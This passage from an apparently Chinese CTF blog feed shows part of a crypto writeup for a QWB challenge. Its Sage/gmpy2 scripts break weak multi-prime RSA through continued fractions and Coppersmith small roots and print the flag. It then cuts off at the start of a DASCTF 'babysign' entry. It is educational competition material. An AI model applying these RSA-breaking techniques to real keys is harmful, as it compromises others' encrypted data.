class="string">e3=8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c11=18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span></span><br><span class="line"><span class="string">c12=336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span></span><br><span class="line"><span class="string">c2=18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span></span><br><span class="line"><span class="string">c3=113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>共有三关</p><ol><li>连分数分解n11、n12，解出m1、m2</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">n11=<span class="number">801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span></span><br><span class="line">e11=<span class="number">1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span></span><br><span class="line">n12=<span class="number">635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span></span><br><span class="line">e12=<span class="number">1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span></span><br><span class="line">c11=<span class="number">18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span></span><br><span class="line">c12=<span class="number">336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span></span><br><span class="line"></span><br><span class="line">c = continued_fraction(Integer(n11) / Integer(n12))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9999</span>)):</span><br><span class="line">    q12 = c.denominator(i)</span><br><span class="line">    q11 = c.numerator(i)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(n11, q11) != <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q11 =&#x27;</span>, q11)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(n12, q12) != <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q12 =&#x27;</span>, q12)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p11 = gmpy2.iroot(n11//q11,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p12 = gmpy2.iroot(n12//q12,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">r = <span class="number">2</span></span><br><span class="line">phi11 = (p11**(r-<span class="number">1</span>))*(p11-<span class="number">1</span>)*(q11-<span class="number">1</span>)</span><br><span class="line">phi12 = (p12**(r-<span class="number">1</span>))*(p12-<span class="number">1</span>)*(q12-<span class="number">1</span>)</span><br><span class="line">d11 = <span class="built_in">int</span>(gmpy2.invert(e11, phi11))</span><br><span class="line">d12 = <span class="built_in">int</span>(gmpy2.invert(e12, phi12))</span><br><span class="line">m1 = <span class="built_in">int</span>(<span class="built_in">pow</span>(c11, d11, n11))</span><br><span class="line">m2 = <span class="built_in">int</span>(<span class="built_in">pow</span>(c12, d12, n12))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m1 =&#x27;</span>, m1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m2 =&#x27;</span>,m2)</span><br></pre></td></tr></table></figure><ol start="2"><li>D3原题，利用m1、m2,求解出b </li></ol><p>构造求t</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n2=<span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line">m1 = <span class="number">167033559384298522723574512241709447697750495062051373339874928117760768631565225663704494711294488556402223152830158600944819657473430506318731286655519728589208977191031849602792050411662024383502548579402516538753112670329781366297260905517214408459895097308286783418547254449419676568096534767340832822470233461516097690657337287889405321592527860524201824371955082411119548743528220794151774190322092515459637969925138496615421690273925560390321721643556915400569894100488394008220811596560968566833296068500476868375996187754631888256419438775013308064639754700359028260289266420692324376220460340153811660590804281527733243177527178698523018103373311259548716062006020121615186595491453534952848570829485638553678760994354019044715078062414748269425818079274218450448217803229617020494546843594180682307375768323235309661628678546003718924902228908888185484412626429441196588985691713767554591991735686919964937441820738008046218954331990752603146125777571183543616375946363623251491371247594696767767918341279655251868517380267258878990871525012299220182939441091806206624720194246691865367941280852353547267930167542329486261552854451001546455904682702366584763940463481732752992487773878685793275652314513014646439770319249</span></span><br><span class="line">m2 = <span class="number">69076592619651589706691933313826601279528159013379300261609967352748175972662567592943146333144902972780621576811778115958019397062270814057821407036352529372113467206560849267275602453288227390740346959857322649956992529510338912182696854496200041245775322561359546062736323363354733510660780489558215103581313753430117471361013972291126160134685745917715386613876414886325025010348396410346222272648657374977901786530969589123771261040601627906959627351426881111464943086191212001374558078570830214670111422731410682212770683631011038163623234630601007231955235905528750031898751733232446644402069580930596404887288935724879795199659228145390574503341087565153744389617539607111733080406125228559950446336384154674927952991964565965760896308198785777527690939982523416579778957846249005801121682470447753074839399698315364445972142571727376297422736232659133510385808957304351692629177239808890209690661982628408419571131470406142532800330250274534615063537773403062635865734585850821677880659194795963303700015814615804751909674946908768425855361277478190640780518117596780808975720826484146074528564147729911624750510271539697935538038871993380673492022099183863825435237650082706168588306816635866830411481021066926833372846305</span></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n2))</span><br><span class="line">f=m1*m2*x-(m1-m2)</span><br><span class="line">f=f.monic()</span><br><span class="line">root=f.small_roots(X=<span class="number">2</span>^<span class="number">1020</span>,beta=<span class="number">0.75</span>,epsilon=<span class="number">0.05</span>)</span><br><span class="line"><span class="built_in">print</span>(m1*m2*root[<span class="number">0</span>]-(m1-m2))</span><br></pre></td></tr></table></figure><p>求解b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="number">94476976265265641827602787049249578492995679429716482046924585940246717457042128023800961434763929914742777719081255795138910954579084380749185583907719246149786618272211075994958101199030515457710810020181711265592718382667417835300679818744556105115902732286571824909924263204098499659317182826854298624775226087960511390966633903776665957086981333664844689954842707299894825527456102357684702900215434762429187279846489983456835800865530440829770728920365517042040572671792205541796259443970816953362137707904728291364281547203770794228054266700322774140643180698948123359117635130447640013942149356692767628491724984585700056921275495622566239919234287223704276388600436608812344828297066467500081684211035484782425572477556398064326931308339522349977262739523525944259951551890257298499759018431685152074240475658756118917712727505720626269640871829914445489979998332574614114421748041115113139535028549083113148306447248881972052070543270343820033948146464079219887051369367284719845962861332344027439802931407999111600574151149695061790549599074232184205241527154267728361392434234918849232230207250936768141824533338058506493444626181620405061810567945382578748509014556142139898554833285230952931366575374187051795954535997</span></span><br><span class="line">n2 = <span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line">m1 = <span class="number">167033559384298522723574512241709447697750495062051373339874928117760768631565225663704494711294488556402223152830158600944819657473430506318731286655519728589208977191031849602792050411662024383502548579402516538753112670329781366297260905517214408459895097308286783418547254449419676568096534767340832822470233461516097690657337287889405321592527860524201824371955082411119548743528220794151774190322092515459637969925138496615421690273925560390321721643556915400569894100488394008220811596560968566833296068500476868375996187754631888256419438775013308064639754700359028260289266420692324376220460340153811660590804281527733243177527178698523018103373311259548716062006020121615186595491453534952848570829485638553678760994354019044715078062414748269425818079274218450448217803229617020494546843594180682307375768323235309661628678546003718924902228908888185484412626429441196588985691713767554591991735686919964937441820738008046218954331990752603146125777571183543616375946363623251491371247594696767767918341279655251868517380267258878990871525012299220182939441091806206624720194246691865367941280852353547267930167542329486261552854451001546455904682702366584763940463481732752992487773878685793275652314513014646439770319249</span></span><br><span class="line">m2 = <span class="number">69076592619651589706691933313826601279528159013379300261609967352748175972662567592943146333144902972780621576811778115958019397062270814057821407036352529372113467206560849267275602453288227390740346959857322649956992529510338912182696854496200041245775322561359546062736323363354733510660780489558215103581313753430117471361013972291126160134685745917715386613876414886325025010348396410346222272648657374977901786530969589123771261040601627906959627351426881111464943086191212001374558078570830214670111422731410682212770683631011038163623234630601007231955235905528750031898751733232446644402069580930596404887288935724879795199659228145390574503341087565153744389617539607111733080406125228559950446336384154674927952991964565965760896308198785777527690939982523416579778957846249005801121682470447753074839399698315364445972142571727376297422736232659133510385808957304351692629177239808890209690661982628408419571131470406142532800330250274534615063537773403062635865734585850821677880659194795963303700015814615804751909674946908768425855361277478190640780518117596780808975720826484146074528564147729911624750510271539697935538038871993380673492022099183863825435237650082706168588306816635866830411481021066926833372846305</span></span><br><span class="line">c2=<span class="number">18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span></span><br><span class="line">e2=<span class="number">65537</span></span><br><span class="line">p2=gmpy2.iroot(gmpy2.gcd(t,n2),<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line">q2=n2//(p2**<span class="number">7</span>)</span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">phi2 = (p2**(r-<span class="number">1</span>))*(p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2 = <span class="built_in">int</span>(gmpy2.invert(e2, phi2))</span><br><span class="line">b = <span class="built_in">int</span>(<span class="built_in">pow</span>(c2,d2,n2))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><ol start="3"><li>coppersmith求解出a，利用a、b、e3求出kphi，解出flag</li></ol><p>求解a</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="number">17623328397444755087284107444487160871617682792372566887446834913712379373851213638071138745775127796589871734472781755930251379295485892067473329763997583502625804363418069062645997342172778252731889437</span></span><br><span class="line">e =<span class="number">464117832584849256876245026858584166064013216027422756825795521498385205721033353513543618744373301203834470328759823648931860535796880222946332534013897265901185999170322696957199889753713456154697105417293751933841379534096463865819008983795657599018683644132673713309334758819574886354704377483001339445757386992879690723631576273460553131155155316952245089907130766287714080403627930928130784991277544248116386917402984270528525775247134214492560997905367291867183866607941929214468777104690392820823035675612092617083295882759857152154377282721152947480472621698324590869278751145403323940075314010289498908873588009861230984997557274773415874956453307178971675014333345657736750118816545969164208900208803031938469633040195998941962960862469507517241931009534811253696410851868499055867913530737331005151134014871819905410958792932531597274862405076661694656088513465559617186646712502574197476333665637476068284511221311807581941866208929989854046731148928578091744976377612425409987679627546723108095722115773079517077535943913527056273328898166164977293075443526474958962783904307031337910198587916917973655637855317764238521650195864421643538425185311500988998567302569476110003110592320332553740947779735694862664952369085</span></span><br><span class="line">n =<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f=x*e-b</span><br><span class="line">f=f.monic()</span><br><span class="line">roots=f.small_roots(X = <span class="number">2</span>^<span class="number">1400</span>,beta = <span class="number">0.1</span>)[<span class="number">0</span>]</span><br><span class="line">a=roots//b</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>求解flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">b = <span class="number">17623328397444755087284107444487160871617682792372566887446834913712379373851213638071138745775127796589871734472781755930251379295485892067473329763997583502625804363418069062645997342172778252731889437</span></span><br><span class="line">a = <span class="number">16731588253866128571163910758846497670928988943944436618514118121761227689113110943465936457030051710610254169629932203082368465978112219532158626669990117160986135699541953274434781877420432743573801621</span></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">e3=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line">n3=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">c3=<span class="number">113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span></span><br><span class="line">phi3 = (e3//b)*a - <span class="number">1</span></span><br><span class="line">d3 = gmpy2.invert(e3, phi3)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c3, d3, n3))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br><span class="line"><span class="comment"># b&#x27;qwb&#123;8633ce6d-fece-4cf1-8f0f-f27e5bf6d678&#125;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>qwb{8633ce6d-fece-4cf1-8f0f-f27e5bf6d678}</p></blockquote><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>已经到能力上限了，最后两道一道五解、一道两解再给两天估计也做不出。</p><p>遗憾未出线😢</p><p>又为什么总在遗憾呢？</p>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022.07赋能赛·Crypto</title>
      <link href="/2022/07/28/2022DASCTF7/"/>
      <url>/2022/07/28/2022DASCTF7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/%E6%88%AA%E5%B1%8F2022-07-24%20%E4%B8%8B%E5%8D%886.08.50.png" alt="solution"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220726130500943.png" alt="image-20220726130500943"></p><h1 id="babysign"><a href="#babysign" class="headerlink" title="babysign"></a>babysign</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 